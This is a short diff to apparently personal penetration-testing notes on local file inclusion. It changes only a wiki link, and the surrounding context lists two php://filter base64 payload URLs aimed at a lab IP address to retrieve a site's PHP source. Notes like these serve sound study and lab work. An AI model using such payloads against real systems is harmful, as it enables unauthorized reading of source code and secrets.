@@ -44,7 +44,7 @@ There are several techniques to exploit LFI, such as directory traversal, null b
 
 ### Website Source Retrieval
 
-These return the Base64 of the site, see [[Base64]] to decode.
+These return the Base64 of the site, see [[3. Exploitation/File Types and Data/Base64]] to decode.
 
 - `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=view`
 - `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=upload`
